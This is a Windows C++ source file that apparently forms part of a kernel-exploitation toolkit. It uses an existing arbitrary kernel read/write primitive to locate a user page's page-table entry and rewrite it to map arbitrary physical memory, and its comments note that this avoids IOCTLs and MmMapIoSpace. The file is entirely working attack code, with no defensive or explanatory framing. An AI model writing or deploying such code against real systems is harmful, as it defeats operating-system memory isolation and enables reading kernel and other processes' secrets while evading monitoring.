#include "pm.hpp"
#include "vmm.hpp"
#include "r0.hpp"
#include <windows.h>
#include <cstring>
#include <cstdio>

namespace pm {

bool g_pm_ok = false;
uint64_t g_slot_va = 0;
uint64_t g_slot_pte = 0;
uint64_t g_orig_pte = 0;
void*  g_slot_mem = nullptr;

bool init(uint64_t pte_base) {
    if (g_pm_ok) return true;
    if (!pte_base) return false;

    // Allocate one private page as the remap slot.
    g_slot_mem = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!g_slot_mem) { printf("[!] pm: VirtualAlloc failed\n"); return false; }
    g_slot_va = reinterpret_cast<uint64_t>(g_slot_mem);

    // Touch the slot so its PTE is definitely present.
    volatile uint8_t* slot = static_cast<volatile uint8_t*>(g_slot_mem);
    slot[0] = 0xAA;
    if (slot[0] != 0xAA) { printf("[!] pm: slot not accessible\n"); return false; }

    // Walk the PTE self-map to find this slot's own PTE.
    constexpr uint64_t kMask48 = 0x0000FFFFFFFFFFFFull;
    const uint64_t m = g_slot_va & kMask48;

    const uint64_t pde_base = pte_base + ((pte_base & kMask48) >> 9);
    const uint64_t ppe_base = pte_base + ((pde_base & kMask48) >> 9);
    const uint64_t pxe_base = pte_base + ((ppe_base & kMask48) >> 9);

    uint64_t e = 0;
    if (!r0::vread(pxe_base + (m >> 39) * 8, &e, 8) || !(e & 1)) {
        printf("[!] pm: PXE read failed\n"); return false;
    }
    if (e & 0x80) { printf("[!] pm: PXE is huge page\n"); return false; }
    if (!r0::vread(ppe_base + (m >> 30) * 8, &e, 8) || !(e & 1)) {
        printf("[!] pm: PPTE read failed\n"); return false;
    }
    if (e & 0x80) { printf("[!] pm: PPTE is huge page\n"); return false; }
    if (!r0::vread(pde_base + (m >> 21) * 8, &e, 8) || !(e & 1)) {
        printf("[!] pm: PDE read failed\n"); return false;
    }
    if (e & 0x80) { printf("[!] pm: PDE is huge page\n"); return false; }
    if (!r0::vread(pte_base + (m >> 12) * 8, &g_orig_pte, 8)) {
        printf("[!] pm: PTE read failed\n"); return false;
    }
    if (!(g_orig_pte & 1)) { printf("[!] pm: PTE not present\n"); return false; }

    g_slot_pte = pte_base + (m >> 12) * 8;
    g_pm_ok = true;
    printf("[+] pm: initialized, slot VA 0x%llx, PTE 0x%llx\n",
           (unsigned long long)g_slot_va, (unsigned long long)g_slot_pte);
    return true;
}

// Read one 4 KB page through the remapped slot. Remaps slot PTE to `pa`,
// flushes TLB, reads directly through slot VA, restores PTE.
bool read_page(uint64_t pa, void* out, size_t len) {
    if (!g_pm_ok || !len || !out || len > 0x1000) return false;

    const uint64_t pa_aligned = pa & ~0xFFFull;
    const uint64_t new_pte = (pa_aligned & vmm::kPteMask) |
                             (g_orig_pte & 0xFFFULL);

    // Write new PTE -> maps slot VA to target physical page.
    if (!r0::vwrite(g_slot_pte, &new_pte, 8)) return false;

    // One TLB flush before read. PTE restore happens after read without
    // a second flush; the restored PTE will be picked up on next access.
    DWORD old = 0;
    if (!VirtualProtect(reinterpret_cast<void*>(g_slot_va), 0x1000,
                        PAGE_READWRITE, &old)) {
        r0::vwrite(g_slot_pte, &g_orig_pte, 8);
        return false;
    }

    // Direct user-mode read through the slot VA (no IOCTL, no MmMapIoSpace).
    memcpy(out, reinterpret_cast<const void*>(g_slot_va), len);

    // Restore original PTE so slot points back to its own page.
    r0::vwrite(g_slot_pte, &g_orig_pte, 8);

    // Restore protection (second TLB flush) so subsequent VirtualAlloc
    // behavior on this VA is consistent.
    VirtualProtect(reinterpret_cast<void*>(g_slot_va), 0x1000, old, &old);

    return true;
}

bool read(uint64_t pa, void* out, size_t len) {
    if (!g_pm_ok || !len || !out) return false;

    auto* p = static_cast<uint8_t*>(out);
    size_t done = 0;
    while (done < len) {
        const uint64_t cur = pa + done;
        size_t chunk = 0x1000 - (cur & 0xFFF);
        if (chunk > len - done) chunk = len - done;
        if (!read_page(cur, p + done, chunk)) return false;
        done += chunk;
    }
    return true;
}

void shutdown() {
    if (g_slot_mem) {
        VirtualFree(g_slot_mem, 0, MEM_RELEASE);
        g_slot_mem = nullptr;
    }
    g_pm_ok = false;
    g_slot_va = 0;
    g_slot_pte = 0;
    g_orig_pte = 0;
}

} // namespace pm
